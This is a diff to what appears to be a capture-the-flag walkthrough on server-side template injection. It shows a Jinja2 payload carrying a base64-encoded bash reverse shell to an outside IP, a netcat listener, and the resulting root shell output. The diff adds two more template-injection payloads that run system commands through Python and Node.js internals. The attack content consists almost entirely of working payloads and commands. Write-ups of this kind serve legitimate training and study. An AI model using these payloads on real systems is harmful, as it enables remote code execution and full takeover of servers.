@@ -98,6 +98,7 @@ nc -lvvp 4444
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
 ```
+
 * if everything works currectly. You should get a reverse shell.
 ```shell
 nc -vv -lnp 4444
@@ -109,6 +110,15 @@ Ncat: Connection from 10.10.11.130:54434.
 sh: 0: can't access tty; job control turned off
 # id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+* or we can try those above commands also, if the previous one desn't works.
+
+```python
+{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
+```
+```python
+{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
 ```
 
 --------------------------------------------------------------------------------
